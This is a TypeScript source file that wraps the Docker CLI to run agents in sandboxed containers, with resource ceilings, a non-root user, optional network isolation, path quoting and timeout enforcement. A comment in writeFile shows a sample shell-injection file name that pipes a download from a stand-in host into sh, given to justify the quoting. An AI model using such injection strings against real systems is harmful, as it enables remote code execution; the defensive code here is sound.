import { FactoryError } from '@factory/shared';
import { TIMEOUT_EXIT_CODE } from '../engines/limits';
import { quoteOne } from './shell';

/**
 * The container host, behind one interface. The Runner is the only component
 * with rights here (research.md D5), and putting the boundary in an interface
 * means the lifecycle logic is testable without a daemon.
 */

export interface ContainerSpec {
  image: string;
  /**
   * Ceilings from the workspace settings (FR-085). Upper bounds on what a run
   * may consume, never minimums: an execution host that offers fixed
   * allocations gives the largest that fits WITHIN these, and refuses to
   * create a sandbox at all when none does (002 FR-005, FR-009).
   */
  cpu: number;
  memoryMb: number;
  /** Not quantised: enforced exactly, by the host itself (002 FR-009a, FR-010). */
  wallClockMinutes: number;
  /**
   * Whether the workspace asked for the network restriction (FR-085).
   *
   * Whether a host can ENFORCE it is a different question, and not one a spec
   * can answer: 002 T006 measured that the intended hosted execution host
   * cannot filter a sandbox's traffic by host in either direction, so on that
   * host reach is all-or-nothing and this flag records an intent it cannot
   * honour. 002 FR-011a requires such a host to say so rather than accept a
   * value it will ignore.
   */
  network: boolean;
  /** Credentials arrive as environment, never as files (FR-083). */
  env: Record<string, string>;
  workdir: string;
}

export interface ExecResult {
  exitCode: number;
  stdout: string;
  stderr: string;
}

export interface ExecOptions {
  cwd?: string;
  env?: Record<string, string>;
  timeoutMs?: number;
  /** Called as output arrives, so the live log is live (FR-076). */
  onOutput?: (stream: 'stdout' | 'stderr', text: string) => void;
}

export interface ContainerHost {
  create(spec: ContainerSpec): Promise<string>;
  exec(containerId: string, argv: string[], options?: ExecOptions): Promise<ExecResult>;
  writeFile(containerId: string, path: string, content: string): Promise<void>;
  readFile(containerId: string, path: string): Promise<string | null>;
  /** Null when the path does not exist. Size distinguishes empty from absent. */
  stat(containerId: string, path: string): Promise<{ size: number } | null>;
  destroy(containerId: string): Promise<void>;
}

/** Shells out to the Docker CLI. One fresh container per run, never reused. */
export const dockerHost: ContainerHost = {
  async create(spec) {
    const argv = [
      'run',
      '--detach',
      '--user',
      // Non-root: an agent runs arbitrary code against a customer repository.
      '1000:1000',
      '--cpus',
      String(spec.cpu),
      '--memory',
      `${spec.memoryMb}m`,
      '--workdir',
      spec.workdir,
      ...(spec.network ? [] : ['--network', 'none']),
      ...Object.keys(spec.env).flatMap((key) => ['--env', key]),
      spec.image,
      'sleep',
      String(spec.wallClockMinutes * 60),
    ];
    const result = await run('docker', argv, { env: spec.env });
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', 'could not create the sandbox', {
        detail: result.stderr.trim(),
      });
    }
    return result.stdout.trim();
  },

  async exec(containerId, argv, options) {
    const env = options?.env ?? {};
    const docker = [
      'exec',
      ...(options?.cwd ? ['--workdir', options.cwd] : []),
      ...Object.keys(env).flatMap((key) => ['--env', key]),
      containerId,
      ...argv,
    ];
    return run('docker', docker, { env, ...options });
  },

  async writeFile(containerId, path, content) {
    // `path` is data — a step's required documents are typed into the pipeline
    // builder, so an unquoted interpolation here would let a document named
    // `a'; curl evil.sh | sh; '.md` run whatever it liked (FR-015).
    const result = await run(
      'docker',
      ['exec', '-i', containerId, 'sh', '-c', `cat > ${quoteOne(path)}`],
      { stdin: content },
    );
    if (result.exitCode !== 0) {
      throw new FactoryError('sandbox_lost', `could not write ${path}`, {
        detail: result.stderr.trim(),
      });
    }
  },

  async readFile(containerId, path) {
    const result = await run('docker', ['exec', containerId, 'cat', path]);
    return result.exitCode === 0 ? result.stdout : null;
  },

  async stat(containerId, path) {
    const result = await run('docker', [
      'exec',
      containerId,
      'sh',
      '-c',
      // Same reason as writeFile: this path came from a person (FR-015).
      `test -f ${quoteOne(path)} && wc -c < ${quoteOne(path)}`,
    ]);
    if (result.exitCode !== 0) return null;
    const size = Number(result.stdout.trim());
    return Number.isFinite(size) ? { size } : null;
  },

  async destroy(containerId) {
    await run('docker', ['rm', '--force', containerId]);
  },
};

/**
 * Exported so the deadline can be proven against a real process. An agent's
 * time limit is only a limit if something enforces it (FR-080), and that
 * something is here.
 */
export async function run(
  command: string,
  argv: string[],
  options: { env?: Record<string, string>; stdin?: string } & ExecOptions = {},
): Promise<ExecResult> {
  const proc = Bun.spawn([command, ...argv], {
    env: { ...process.env, ...options.env },
    stdin: options.stdin ? new TextEncoder().encode(options.stdin) : 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
  });

  // An agent's time limit is only a limit if something enforces it (FR-080).
  // The deadline kills the process and reports the same code `timeout(1)`
  // uses, so the caller can tell a deadline from an ordinary failure.
  let killedAtDeadline = false;
  const deadline = options.timeoutMs
    ? setTimeout(() => {
        killedAtDeadline = true;
        proc.kill('SIGKILL');
      }, options.timeoutMs)
    : null;

  try {
    const [stdout, stderr] = await Promise.all([
      drain(proc.stdout, (text) => options.onOutput?.('stdout', text)),
      drain(proc.stderr, (text) => options.onOutput?.('stderr', text)),
    ]);
    const exitCode = await proc.exited;
    return killedAtDeadline
      ? {
          exitCode: TIMEOUT_EXIT_CODE,
          stdout,
          stderr: `${stderr}\nstopped after ${options.timeoutMs}ms`.trim(),
        }
      : { exitCode, stdout, stderr };
  } finally {
    if (deadline) clearTimeout(deadline);
  }
}

async function drain(
  stream: ReadableStream<Uint8Array>,
  onChunk?: (text: string) => void,
): Promise<string> {
  const decoder = new TextDecoder();
  let all = '';
  for await (const chunk of stream) {
    const text = decoder.decode(chunk, { stream: true });
    all += text;
    onChunk?.(text);
  }
  return all;
}
